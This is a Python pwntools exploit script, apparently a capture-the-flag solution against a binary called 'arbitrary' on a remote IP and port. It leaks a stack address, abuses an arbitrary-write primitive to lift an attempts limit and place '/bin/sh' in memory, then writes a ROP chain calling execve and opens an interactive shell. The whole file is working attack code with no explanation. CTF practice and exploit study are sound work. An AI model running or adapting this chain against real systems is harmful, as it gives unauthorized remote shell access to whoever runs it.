from pwn import *

context.clear(arch='i386')
context.kernel = 'amd64'

elf = ELF("./arbitrary")



def main():
    stack_addr = hex(elf.symbols["environ"])
   # c = process("./arbitrary")
    c = remote('52.8.15.62', '8009')
    c.recv()
    c.sendline(str(stack_addr).encode())
    #input()
    res = c.recv().decode()
    print(res)
    addr = int(res.split("I just love ")[1].split(", ")[0], 16)
    esp = addr - 0xffa03b1c + 0xffa03990 - 0x10
    attempts_pos = esp + 0x10
    ret_pos = esp + 0x40
    #binsh_pos = esp - 0x30
    binsh_pos = 0x080EF570
    binsh_le_val0 = int.from_bytes(b'/bin', 'little')
    binsh_le_val1 = int.from_bytes(b'/sh\x00', 'little')
    print()
    print(f"found esp @ {hex(esp)}")
    
    #dat = c.leak(attempts_pos, 4)
    
    #print(dat)
    print(f"writing to attempts @ {attempts_pos}")
    c.sendline(hex(attempts_pos).encode())
    #infinite tries working 2026
    c.sendline('0x0fffffff'.encode())
    c.recv()

    #we dont need a read 
    print("using placeholder read")
    c.sendline(line=stack_addr.encode())
    
    print("writing /bin/sh")
    #write /bin/sh
    c.sendline(hex(binsh_pos).encode())
    c.sendline(hex(binsh_le_val0).encode())
    c.recv()

    print("using placeholder read")
    c.sendline(line=stack_addr.encode())
    c.sendline(hex(binsh_pos + 4).encode())
    c.sendline(hex(binsh_le_val1).encode())
    c.recv()



    
    #print(c.leak(binsh_pos, 8))

    # dat = c.leak(esp, 0x40)
    # for i in range(0, len(dat), 4):
    #     v = dat[i:i+4]
    #     print(hex(int.from_bytes(v, 'little')))


    rop = ROP(elf)
    rop.call("execve", [binsh_pos, 0, 0])
    ropdata = rop.chain()
    write_ptr = ret_pos - 0x4
    for i in range(0, len(ropdata), 4):
        v = ropdata[i:i+4]
        v_num = int.from_bytes(v, 'little')
        c.sendline(line=stack_addr.encode())
        #print(f"overwrite {hex(int.from_bytes(c.leak(write_ptr, 0x4),  'little'))}")
        print(f"write {hex(v_num)} @ {hex(write_ptr)}")
        c.sendline(hex(write_ptr).encode())
        c.sendline(hex(v_num).encode())
        c.recv()
        write_ptr += 4
    c.sendline(line=stack_addr.encode())
    print("written chain")
    # dat = c.leak(esp, 0x40)
    # for i in range(0, len(dat), 4):
    #     v = dat[i:i+4]
    #     print(hex(int.from_bytes(v, 'little')))
    input()
    c.sendline(hex(attempts_pos).encode())
    c.sendline(hex(0).encode())
    




    
    c.interactive()




main()